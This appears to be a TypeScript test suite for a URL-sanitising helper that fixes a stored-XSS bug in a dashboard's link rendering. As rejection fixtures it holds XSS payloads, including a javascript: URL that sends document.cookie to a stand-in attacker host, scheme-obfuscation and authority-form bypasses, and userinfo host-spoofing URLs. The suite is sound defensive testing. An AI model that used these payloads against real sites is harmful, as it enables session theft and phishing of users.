/**
 * Pins for the client-side half of the stored-XSS fix.
 *
 * The server now rejects non-http(s) schemes at the write boundary, but rows
 * written before that check existed are still in the database and are returned
 * verbatim, so the render path has to re-check.
 */
import { existsSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';
import { assert } from './assertions.js';
import { SAFE_SCHEMES, safeHref } from './safe-url.js';

/**
 * Resolve web/src. These tests are compiled into .tmp-test/ before running, so
 * import.meta.url points at the build output, not at the sources. Walk up to the
 * directory holding package.json and take src/ from there, which works whether
 * this runs from src/ or from .tmp-test/.
 */
function sourceRoot(): string {
  let dir = fileURLToPath(new URL('.', import.meta.url));
  while (!existsSync(join(dir, 'package.json'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate web/package.json from ' + import.meta.url);
    dir = parent;
  }
  return join(dir, 'src');
}

/** Repository root: the directory above web/, identified by go.mod. */
function repoRoot(): string {
  let dir = dirname(sourceRoot());
  while (!existsSync(join(dir, 'go.mod'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate go.mod above ' + sourceRoot());
    dir = parent;
  }
  return dir;
}


const XSS = "javascript:fetch('//attacker/'+document.cookie)";

/**
 * Every one of these must be refused. Note that several are NOT rejected by
 * Go's net/url (which errors on control characters) but ARE normalised by the
 * WHATWG URL parser the browser and this helper use: `new URL('java\tscript:x')`
 * yields protocol 'javascript:'. That divergence is exactly why this has to be
 * an allow-list on the parsed scheme rather than a denylist on the raw string.
 */
function testRejectsUnsafeSchemes(): void {
  const rejected: ReadonlyArray<readonly [string, string]> = [
    ['javascript', 'javascript:alert(1)'],
    ['javascript exfiltration', XSS],
    ['javascript mixed case', 'JaVaScRiPt:alert(1)'],
    ['javascript upper case', 'JAVASCRIPT:alert(1)'],
    ['leading tab', '\tjavascript:alert(1)'],
    ['leading newline', '\njavascript:alert(1)'],
    ['leading space', ' javascript:alert(1)'],
    ['embedded tab', 'java\tscript:alert(1)'],
    ['embedded newline', 'java\nscript:alert(1)'],
    ['embedded carriage return', 'java\rscript:alert(1)'],
    ['data html', 'data:text/html,<script>alert(1)</script>'],
    ['data base64', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['vbscript', 'vbscript:msgbox(1)'],
    ['blob', 'blob:https://example.com/uuid'],
    ['file', 'file:///etc/passwd'],
    // mailto: is a deliberate rejection, not an oversight: the server's
    // allow-list rejects it too, so rendering it would be dead code.
    ['mailto', 'mailto:a@b.com'],
    // Relative and protocol-relative inputs are rejected because there is no
    // base argument. With one, '//evil.com/x' would become an ACCEPTED
    // 'https://evil.com/x'.
    ['protocol relative', '//evil.com/x'],
    ['absolute path', '/relative/path'],
    ['bare word', 'not-a-url'],
    ['http without host', 'http://'],
    ['empty', ''],

    // ── fixtures that isolate the scheme allow-list ─────────────────────────
    //
    // Everything above this line is rejected by BOTH guards, or throws before
    // reaching either, so none of it can tell the allow-list apart from the
    // host check. Measured: with only the rows above, deleting the allow-list
    // outright, or widening it to include javascript:/data:/vbscript:, left
    // the suite GREEN.
    //
    // Every row below this point parses successfully AND yields a non-empty
    // hostname, so the host check cannot reject any of them. The allow-list is
    // the only thing that does.
    //
    // The first four get there by being WHATWG "special" schemes; the last two
    // by carrying an authority on a NON-special scheme, which is the case the
    // host guard's docblock used to say could not happen.
    ['ftp', 'ftp://evil.com/x'],
    ['ws', 'ws://evil.com/x'],
    ['wss', 'wss://evil.com/x'],
    // Also distinguishes membership from a prefix test: a scheme that starts
    // with "http" but is not "http". Guards against `startsWith('http')`.
    ['httpx prefix not membership', 'httpx://evil.com/x'],
    // The authority form of a script-bearing scheme. Unlike every other
    // javascript:/data: row above, this one parses with hostname 'evil.com',
    // so safeHref's hostname==='' guard does NOT reject it -- the allow-list
    // is the only thing that does. In a browser `//evil.com/` is a line
    // comment and %0a ends it, so alert(1) runs. See
    // testHostGuardIsAFailClosedBackstop.
    ['javascript with an authority', 'javascript://evil.com/%0aalert(1)'],
    ['data with an authority', 'data://evil.com/x'],
  ];

  for (const [name, input] of rejected) {
    assert(
      safeHref(input) === undefined,
      `safeHref(${JSON.stringify(input)}) should be undefined for "${name}", got ${JSON.stringify(safeHref(input))}`,
    );
  }

  assert(safeHref(undefined) === undefined, 'safeHref(undefined) should be undefined');
  assert(safeHref(null) === undefined, 'safeHref(null) should be undefined');
}

function testAcceptsHTTPAndHTTPS(): void {
  const accepted: readonly string[] = [
    'https://github.com/o/r/pull/1',
    'http://example.com/x',
    'HtTpS://example.com',
    'https://example.com:8443/x',
    'https://example.com/x?a=1&b=2#frag',
  ];
  for (const input of accepted) {
    assert(
      safeHref(input) === input,
      `safeHref(${JSON.stringify(input)}) should return the input unchanged, got ${JSON.stringify(safeHref(input))}`,
    );
  }
}

/**
 * Credential rejection: safeHref refuses any URL carrying userinfo.
 *
 * DESTINATION CONFUSION, not scheme escalation. Every input below is http(s)
 * with a non-empty host, so the scheme allow-list and the `hostname === ''`
 * guard both wave it through -- the credential clause is the ONLY thing that
 * refuses them. `https://github.com@evil.example/` is the shape that matters:
 * the part a reader recognises is the USERINFO and the host is attacker-chosen,
 * and both call sites render STATIC link text, so nothing on screen contradicts
 * the misreading.
 *
 * WHY THE SUMMARY ASSERTION COMES FIRST. A per-case loop alone reports the first
 * failure and stops, which cannot distinguish "one shape regressed" from "the
 * clause was deleted". The summary names how many of the class got through
 * before the rows name which.
 *
 * The pre-existing fixture in testdata/url-scheme-cases.json pinned exactly one
 * credential shape -- `https://user:pass@example.com/x` -- in which the userinfo
 * and the host DO NOT CONFLICT. That is a credentials-present case, not a
 * host-spoofing case, so the spoofing shapes this clause exists for were pinned
 * nowhere. They are pinned here and in that file.
 */
function testRejectsCredentials(): void {
  const credentialed: readonly (readonly [string, string])[] = [
    ['user and password', 'https://user:pass@example.com/x'],
    ['bare user, no password', 'https://user@example.com/x'],
    ['trailing colon, empty password', 'https://user:@example.com/x'],
    ['empty username, password only', 'https://:pass@evil.example/'],
    ['userinfo spoofing a familiar host', 'https://ok.example@evil.example/'],
    ['userinfo spoofing github.com', 'https://github.com@evil.example/'],
    ['spoofing userinfo with a plausible path', 'https://github.com@evil.example/o/r/pull/1'],
    ['http, so the clause is not https-only', 'http://github.com@evil.example/'],
  ];

  // SUMMARY FIRST: how many of the class got through, before which ones.
  const accepted = credentialed.filter(([, input]) => safeHref(input) !== undefined);
  assert(
    accepted.length === 0,
    `${accepted.length} of ${credentialed.length} credential-bearing URLs were accepted by ` +
      `safeHref: ${JSON.stringify(accepted.map(([name]) => name))}`,
  );

  for (const [name, input] of credentialed) {
    assert(
      safeHref(input) === undefined,
      `safeHref(${JSON.stringify(input)}) should be undefined for "${name}", got ${JSON.stringify(safeHref(input))}`,
    );
  }

  // POSITIVE ARM. Without it this whole table is satisfied by a safeHref that
  // returns undefined for everything -- a dead instrument reading "all
  // credentials rejected" while rejecting the entire product.
  const stillAccepted: readonly string[] = [
    'https://github.com/o/r/pull/1',
    'http://example.com/x',
    'https://example.com:8443/x',
    'https://example.com/x?a=1&b=2#frag',
  ];
  for (const input of stillAccepted) {
    assert(
      safeHref(input) === input,
      `positive arm: safeHref(${JSON.stringify(input)}) must still be returned unchanged, ` +
        `got ${JSON.stringify(safeHref(input))}`,
    );
  }

  // The clause tests BOTH fields. A check on `username` alone would let the
  // empty-username row past, so pin that the shape really does parse that way
  // rather than trusting the row's name.
  const emptyUser = new URL('https://:pass@evil.example/');
  assert(
    emptyUser.username === '' && emptyUser.password === 'pass',
    `fixture drift: https://:pass@evil.example/ parsed as username ${JSON.stringify(emptyUser.username)} ` +
      `password ${JSON.stringify(emptyUser.password)}; this row exists to justify testing password too`,
  );

  // And pin the destination confusion itself: userinfo that LOOKS like the host.
  const spoof = new URL('https://github.com@evil.example/');
  assert(
    spoof.hostname === 'evil.example' && spoof.username === 'github.com',
    `fixture drift: https://github.com@evil.example/ parsed as host ${JSON.stringify(spoof.hostname)} ` +
      `username ${JSON.stringify(spoof.username)}; this table would no longer test destination confusion`,
  );
}

/**
 * Pins the reachability precondition of safeHref's `hostname === ''` guard.
 *
 * That guard cannot be pinned by a fixture, because no input reaches it: both
 * allow-listed schemes are WHATWG "special" schemes, for which an empty host
 * makes the parse THROW rather than yield an empty hostname. Deleting the
 * guard therefore leaves every behavioural test green, and no fixture can
 * change that -- unreachable code has no behaviour to assert on.
 *
 * What IS pinnable is the condition under which the guard becomes live: a
 * non-special scheme in SAFE_SCHEMES. This test fails the moment one is added
 * -- i.e. the moment the guard stops being unreachable.
 *
 * HOW MUCH THE GUARD WOULD THEN BE WORTH, which an earlier version of this
 * docblock overstated. It said "every script-bearing scheme (javascript:,
 * data:, vbscript:, blob:, mailto:) is NON-special and parses with
 * hostname === '', so the guard is precisely what makes an accidental widening
 * of SAFE_SCHEMES fail closed". True of the authority-less form, false of the
 * authority form, and the conclusion does not survive the difference:
 * `javascript://evil.com/%0aalert(1)` parses with hostname 'evil.com' and
 * executes, because `//evil.com/` is a JS line comment and %0a ends it. The
 * guard would let it past. It closes the common shape, not the class.
 *
 * That is measured below rather than asserted in prose, and it is measured for
 * all five schemes, not just javascript:.
 */
function testHostGuardIsAFailClosedBackstop(): void {
  assert(SAFE_SCHEMES.size > 0, 'SAFE_SCHEMES is empty; this test would be vacuous');

  for (const scheme of SAFE_SCHEMES) {
    let threw = false;
    try {
      new URL(`${scheme}//`);
    } catch {
      threw = true;
    }
    assert(
      threw,
      `${scheme} is a non-special scheme: "${scheme}//" parses with an empty host instead of ` +
        'throwing. safeHref\'s hostname==="" guard is now REACHABLE and load-bearing, so it ' +
        'needs a real rejection fixture -- and adding a non-special scheme to SAFE_SCHEMES is ' +
        'itself almost certainly a mistake, since every script-bearing scheme is non-special.',
    );
  }

  // Positive control: the detector must actually be able to see a non-special
  // scheme. Without this, the loop above would pass if `new URL` threw for
  // everything, or if the set were silently unreadable.
  let nonSpecialThrew = false;
  try {
    new URL('javascript://');
  } catch {
    nonSpecialThrew = true;
  }
  assert(
    !nonSpecialThrew,
    'positive control: "javascript://" should parse (non-special schemes tolerate an empty ' +
      'host); if it throws, this test can no longer tell special from non-special schemes',
  );
  assert(
    new URL('javascript://').hostname === '',
    'positive control: a non-special scheme should yield hostname === "", which is the ' +
      'condition the guard under test exists to catch',
  );

  // THE LIMIT OF THE GUARD, measured rather than argued. Each of these is a
  // script-bearing scheme in its AUTHORITY form, and each yields a non-empty
  // hostname -- so the hostname === '' guard would not stop any of them if the
  // scheme were allow-listed by mistake.
  const authorityForms: ReadonlyArray<readonly [string, string]> = [
    ['javascript', 'javascript://evil.com/%0aalert(1)'],
    ['data', 'data://evil.com/x'],
    ['vbscript', 'vbscript://evil.com/x'],
    ['blob', 'blob://evil.com/x'],
    ['mailto', 'mailto://evil.com/x'],
  ];
  for (const [name, input] of authorityForms) {
    assert(
      new URL(input).hostname !== '',
      `${name}: ${input} was expected to parse with a NON-empty hostname. If it now yields ` +
        "'', the host guard has become a genuine fail-closed backstop for this scheme and " +
        'the comments in safe-url.ts and above should be corrected in the other direction.',
    );
  }

  // And the whole point of the exercise: the allow-list, not the host guard, is
  // what rejects it today.
  assert(
    safeHref('javascript://evil.com/%0aalert(1)') === undefined,
    'safeHref must reject javascript://evil.com/%0aalert(1). This is the input that shows ' +
      'the hostname guard is not a fail-closed backstop: it parses with hostname ' +
      "'evil.com', so only the scheme allow-list stands between it and an href -- and " +
      'in a browser `//evil.com/` is a comment, %0a ends it, and alert(1) runs.',
  );
}

interface URLSchemeCase {
  readonly name: string;
  readonly input: string;
  readonly server: 'accept' | 'reject';
  readonly client: 'accept' | 'reject';
  readonly base_dependent?: boolean;
  readonly note?: string;
}

function loadSchemeCases(): readonly URLSchemeCase[] {
  const path = join(repoRoot(), 'testdata', 'url-scheme-cases.json');
  const doc = JSON.parse(readFileSync(path, 'utf8')) as { cases?: readonly URLSchemeCase[] };
  const cases = doc.cases ?? [];
  assert(cases.length > 0, `${path} contains no cases; the tests reading it would be vacuous`);
  return cases;
}

/**
 * The CLIENT half of the server/client differential pin.
 *
 * The other half is TestValidateURLFieldMatchesSharedFixtures in
 * internal/server/urlvalidate_differential_test.go. Both read the same
 * testdata/url-scheme-cases.json; that one asserts the "server" column against
 * validateURLField, this one asserts the "client" column against safeHref.
 *
 * Why the file is shared rather than each side keeping its own table: two
 * independent tables can both be green while disagreeing with each other, which
 * is exactly the state this branch shipped in. safe-url.ts asserted the two
 * guards agreed and concluded that "a scheme the client allows and the server
 * rejects is unreachable". The scheme SETS agree. The DECISIONS do not: 13 of
 * these 45 inputs are decided differently. Now neither side can move without
 * turning its own half red, and reconciling them on paper turns
 * TestSharedFixturesRecordRealDivergences red.
 *
 * This also subsumes the low-severity gaps in the rejection table: control
 * characters, case folding, and a bare space are all fixtures here, decided
 * against a recorded expectation rather than lumped into a single "must be
 * rejected" loop that cannot say WHY something was rejected.
 */
function testSharedFixturesMatchClientColumn(): void {
  const path = join(repoRoot(), 'testdata', 'url-scheme-cases.json');
  const cases = loadSchemeCases();

  let divergent = 0;
  for (const c of cases) {
    assert(
      c.client === 'accept' || c.client === 'reject',
      `fixture ${JSON.stringify(c.name)} has an invalid "client" value ${JSON.stringify(c.client)}`,
    );
    const got = safeHref(c.input) === undefined ? 'reject' : 'accept';
    assert(
      got === c.client,
      `safeHref(${JSON.stringify(c.input)}) = ${got}, but testdata/url-scheme-cases.json ` +
        `records ${c.client} for "${c.name}". Either safeHref's policy changed (update the ` +
        'fixture and say why), or this is a regression.',
    );
    if (c.server !== c.client) divergent++;
  }

  // Anti-vacuity, and the same control the Go half applies from the other side:
  // if the divergences were quietly edited away, this loop would still pass
  // while the claim it defends in safe-url.ts became untrue in the other
  // direction.
  assert(
    divergent > 0,
    `${path} records no server/client divergences. safe-url.ts's comment says the two guards ` +
      'disagree and points here for the evidence; if that is no longer true, update the comment ' +
      'deliberately rather than letting this test pass over an empty set.',
  );
}

/**
 * Makes the `"base_dependent"` markers in testdata/url-scheme-cases.json a
 * checked fact instead of an annotation.
 *
 * WHY THE MARKER EXISTS. safeHref decides on `new URL(raw)` with no base. The
 * sink is an `<a>` in a document, which always resolves against the document
 * base, and under WHATWG rules an input whose scheme equals the base's scheme is
 * parsed as a RELATIVE reference. So for some inputs the host safeHref reasoned
 * about is not the host the browser navigates to, and several fixture notes used
 * to state those hosts as flat facts ('the browser navigates there'). Anyone
 * later reasoning about open-redirect risk from a note would reason from the
 * wrong host.
 *
 * WHAT IS MEASURED. Each input is set as the href of a real anchor in two real
 * JSDOM documents, one based at an http origin and one at an https origin, and
 * the resolved hostnames are compared. `"base_dependent": true` must be present
 * exactly when they differ. Both directions fail: an unmarked case that turns
 * out to be base-dependent, and a marker on a case that is not.
 *
 * This is deliberately NOT a check that the marked set has some expected size --
 * a count would survive marking the wrong six cases.
 */
function testBaseDependenceMarkersAreAccurate(): void {
  const HTTPS_BASE = 'https://dash.internal.test/app/';
  const HTTP_BASE = 'http://localhost:8080/app/';

  // Separate short-lived documents; deliberately not domEnvironment(), whose
  // window is a singleton fixed at one base and shared with the component tests.
  function hostAt(base: string, raw: string): string {
    const dom = new JSDOM('<a id="probe"></a>', { url: base });
    const a = dom.window.document.getElementById('probe')!;
    a.setAttribute('href', raw);
    return (a as HTMLAnchorElement).hostname;
  }

  // Positive control 1: the probe must resolve relative references against the
  // base at all. Without this every "not base-dependent" verdict below could be
  // an anchor that ignores its document.
  assert(
    hostAt(HTTPS_BASE, '/x') === 'dash.internal.test' && hostAt(HTTP_BASE, '/x') === 'localhost',
    'positive control: a root-relative href must resolve against the document base; ' +
      `got ${hostAt(HTTPS_BASE, '/x')} and ${hostAt(HTTP_BASE, '/x')}`,
  );
  // Positive control 2: an absolute URL must be unaffected by the base, or every
  // case would look base-dependent.
  assert(
    hostAt(HTTPS_BASE, 'https://example.com/y') === 'example.com' &&
      hostAt(HTTP_BASE, 'https://example.com/y') === 'example.com',
    'positive control: an absolute URL must resolve to its own host under either base',
  );

  let marked = 0;
  for (const c of loadSchemeCases()) {
    const https = hostAt(HTTPS_BASE, c.input);
    const http = hostAt(HTTP_BASE, c.input);
    const measured = https !== http;
    const declared = c.base_dependent === true;
    if (declared) marked += 1;
    assert(
      measured === declared,
      `fixture ${JSON.stringify(c.name)} (${JSON.stringify(c.input)}): resolved host is ` +
        `${JSON.stringify(https)} on an https base and ${JSON.stringify(http)} on an http one, ` +
        `so base_dependent should be ${measured}, but the fixture says ${declared}. ` +
        (measured
          ? 'Add "base_dependent": true and say in the note that the host in it is safeHref\'s ' +
            'base-less parse, not the browser\'s.'
          : 'Remove the marker: a marker on a case that is not base-dependent teaches the next ' +
            'reader to distrust the ones that are.'),
    );
  }

  // Anti-vacuity: if nothing is marked, the loop above is 45 assertions that
  // "false === false" and the whole apparatus proves nothing.
  assert(
    marked > 0,
    'no fixture is marked base_dependent. The property is real -- http:/example.com resolves ' +
      "to the dashboard's own host on an http dashboard -- so an empty marked set means the " +
      'markers were dropped, not that the problem went away.',
  );
}

/**
 * Install a JSDOM window as the global environment.
 *
 * This has to happen BEFORE lit or any component module is loaded: lit
 * evaluates DOM globals at module scope, and the component modules call
 * customElements.define() via @customElement as a side effect of being
 * imported. Hence the dynamic import()s in the test below rather than
 * top-of-file static imports.
 */
function installDOMGlobals(dom: InstanceType<typeof JSDOM>): void {
  for (const key of Object.getOwnPropertyNames(dom.window)) {
    if (key in globalThis) continue;
    try {
      (globalThis as Record<string, unknown>)[key] = (dom.window as unknown as Record<string, unknown>)[key];
    } catch {
      // Some window properties are getter-only; none of those are needed here.
    }
  }
  (globalThis as Record<string, unknown>).window = dom.window;
  (globalThis as Record<string, unknown>).document = dom.window.document;
}

let sharedDOM: InstanceType<typeof JSDOM> | undefined;

/**
 * One JSDOM window for the whole file. It has to be a singleton: custom
 * elements are registered against whatever `customElements` is global at import
 * time, so a second window would leave the already-registered components bound
 * to the first one.
 */
function domEnvironment(): InstanceType<typeof JSDOM> {
  if (sharedDOM === undefined) {
    sharedDOM = new JSDOM('<!doctype html><body><div id="host"></div></body>', {
      pretendToBeVisual: true,
      url: 'https://dashboard.test/',
    });
    installDOMGlobals(sharedDOM);
  }
  return sharedDOM;
}

/**
 * The behavioural pin: a persisted javascript: URL must not reach the href
 * attribute of a real DOM node.
 *
 * This drives the two REAL production render functions --
 * ft-inspector-code.ts::renderPrLink and
 * ft-inspector-meta.ts::renderExternalSourceLink -- through lit's render() into
 * a real JSDOM tree, and reads the attribute back off the resulting node.
 *
 * It previously declared its own renderGuarded() copy of the guarded shape
 * inside this file and asserted against that. That version was decorative:
 * changing `const href = safeHref(url)` to `const href = url` in EITHER
 * production function shipped green, because neither function was ever
 * imported. A check that derives from the thing it is checking cannot falsify
 * it. The copy is gone; these assertions now fail if either real function
 * stops calling safeHref.
 */
async function testPayloadNeverReachesHrefAttribute(): Promise<void> {
  const dom = domEnvironment();

  const { render } = await import('lit');
  const { renderPrLink } = await import('../components/inspector/ft-inspector-code.js');
  const { renderExternalSourceLink } = await import('../components/inspector/ft-inspector-meta.js');

  const doc = dom.window.document;
  const host = doc.getElementById('host')!;

  const cases: ReadonlyArray<{
    readonly name: string;
    readonly renderBad: () => void;
    readonly renderGood: () => void;
    readonly good: string;
  }> = [
    {
      name: 'ft-inspector-code.ts::renderPrLink',
      renderBad: () => render(renderPrLink(XSS, 'PR-1'), host),
      renderGood: () => render(renderPrLink('https://github.com/o/r/pull/1', 'PR-1'), host),
      good: 'https://github.com/o/r/pull/1',
    },
    {
      name: 'ft-inspector-meta.ts::renderExternalSourceLink',
      renderBad: () => render(renderExternalSourceLink(XSS), host),
      renderGood: () => render(renderExternalSourceLink('https://example.com/x'), host),
      good: 'https://example.com/x',
    },
  ];

  for (const c of cases) {
    c.renderBad();
    assert(
      host.querySelector('a') === null,
      `${c.name}: a javascript: URL must not produce an anchor at all, got: ${host.innerHTML}`,
    );
    assert(
      host.querySelector('[href]') === null,
      `${c.name}: no element should carry an href attribute, got: ${host.innerHTML}`,
    );
    // Degrade, do not drop: the rejected value stays visible to the user. Both
    // functions surface it in a title attribute on an inert element.
    const inert = host.querySelector('[title]');
    assert(
      inert !== null && (inert.getAttribute('title') ?? '').includes(XSS),
      `${c.name}: rejected URL should stay visible in a title attribute, got: ${host.innerHTML}`,
    );

    // Positive control, and note what it controls: it controls THIS harness --
    // that lit + JSDOM + these real functions can produce an href at all. If
    // this failed, the "no href" assertions above would be passing vacuously,
    // for example because render() silently no-opped. It does NOT control the
    // guard; the assertions above do.
    c.renderGood();
    const anchor = host.querySelector('a');
    assert(
      anchor !== null,
      `${c.name}: positive control -- a legitimate https URL must produce an anchor`,
    );
    assert(
      anchor!.getAttribute('href') === c.good,
      `${c.name}: positive control -- href should be ${c.good}, got ${anchor!.getAttribute('href')}`,
    );
    assert(
      anchor!.getAttribute('target') === '_blank' && anchor!.getAttribute('rel') === 'noopener',
      `${c.name}: positive control -- the rendered anchor must keep target="_blank" rel="noopener", got: ${host.innerHTML}`,
    );
  }
}

/** Minimal shape of a LitElement instance, for a node made by createElement. */
interface LitLike extends HTMLElement {
  codeContext: unknown;
  updateComplete: Promise<unknown>;
}

/**
 * The guard must hold for EVERY pull request in the list, not just the first.
 *
 * testPayloadNeverReachesHrefAttribute drives renderPrLink one call at a time,
 * so it cannot see a list bug: a template that guarded pullRequests[0] and
 * interpolated the rest raw would pass it. This renders the REAL
 * <ft-inspector-code> custom element -- its own .map() over ctx.pullRequests,
 * not a copy of it -- with a two-element list, in both orderings.
 *
 * Both orderings matter. Poisoned-first catches "the loop bails out after the
 * first rejection"; poisoned-second catches "only index 0 is guarded".
 */
async function testGuardHoldsForEveryItemInAList(): Promise<void> {
  const dom = domEnvironment();
  // Importing the module is what registers <ft-inspector-code>, via @customElement.
  await import('../components/inspector/ft-inspector-code.js');

  const doc = dom.window.document;
  const good = 'https://github.com/acme/widgets/pull/2';

  const orderings: ReadonlyArray<{ readonly name: string; readonly urls: readonly string[] }> = [
    { name: 'poisoned first', urls: [XSS, good] },
    { name: 'poisoned second', urls: [good, XSS] },
  ];

  for (const { name, urls } of orderings) {
    const el = doc.createElement('ft-inspector-code') as LitLike;
    el.codeContext = {
      repo: 'acme/widgets',
      branch: 'main',
      pullRequests: urls.map((url, i) => ({ url, id: `PR-${i + 1}`, status: 0 })),
    };
    doc.getElementById('host')!.appendChild(el);
    await el.updateComplete;

    const root = el.shadowRoot;
    assert(root !== null, `${name}: component rendered no shadow root`);

    const hrefs = [...root!.querySelectorAll('[href]')].map((a) => a.getAttribute('href'));
    assert(
      hrefs.length === 1 && hrefs[0] === good,
      `${name}: exactly one href should survive the list, the legitimate one. Got ${JSON.stringify(hrefs)}. ` +
        'If both survived, the list is interpolating raw URLs; if neither did, see the control below.',
    );

    // Degrade, do not drop: the rejected entry is still rendered, still shows
    // its id, and still exposes the raw value.
    const unsafe = root!.querySelector('.pr-link-unsafe');
    assert(
      unsafe !== null && (unsafe.getAttribute('title') ?? '').includes(XSS),
      `${name}: the rejected PR should render as inert text carrying the raw URL in a title, got: ${root!.innerHTML}`,
    );

    // Positive control for THIS harness: the component must render both list
    // items at all. Without it, "exactly one href" would also be satisfied by a
    // component that silently dropped every item after the first.
    const items = root!.querySelectorAll('.pr-item');
    assert(
      items.length === 2,
      `${name}: positive control -- the component should render both list items, got ${items.length}. ` +
        'The href assertion above is vacuous unless both items are actually in the tree.',
    );

    el.remove();
  }
}

/**
 * target="_blank" is currently an incidental mitigation on both anchors: engines
 * block javascript: navigation into a new browsing context, but nothing pinned
 * that attribute, so removing it would quietly change the severity of any URL
 * that slipped past the scheme checks. This pins it.
 */
function testExternalAnchorsKeepTargetBlank(): void {
  const files = [
    'components/inspector/ft-inspector-code.ts',
    'components/inspector/ft-inspector-meta.ts',
  ];
  const src = sourceRoot();

  for (const rel of files) {
    const text = readFileSync(join(src, rel), 'utf8');
    const anchors = text.split('\n').filter((l) => l.includes('href=${href}'));
    assert(anchors.length > 0, `${rel}: expected a guarded href=\${href} anchor, found none`);
    for (const line of anchors) {
      assert(
        line.includes('target="_blank"'),
        `${rel}: guarded anchor lost target="_blank": ${line.trim()}`,
      );
      assert(
        line.includes('rel="noopener"'),
        `${rel}: guarded anchor lost rel="noopener": ${line.trim()}`,
      );
    }
  }
}

async function run(): Promise<void> {
  testRejectsUnsafeSchemes();
  testAcceptsHTTPAndHTTPS();
  testRejectsCredentials();
  testHostGuardIsAFailClosedBackstop();
  testSharedFixturesMatchClientColumn();
  testBaseDependenceMarkersAreAccurate();
  await testPayloadNeverReachesHrefAttribute();
  await testGuardHoldsForEveryItemInAList();
  testExternalAnchorsKeepTargetBlank();
  console.log('safe-url: ok');
}

await run();
